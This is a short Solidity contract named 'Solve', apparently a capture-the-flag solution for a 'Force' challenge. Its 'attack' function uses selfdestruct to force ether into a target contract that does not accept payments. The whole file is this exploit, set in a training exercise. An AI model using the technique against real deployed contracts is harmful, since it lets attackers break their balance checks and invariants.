// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Force.sol";

contract Solve {
    constructor() payable {}

    function attack(address payable _address) public {
        selfdestruct(_address);
    }
}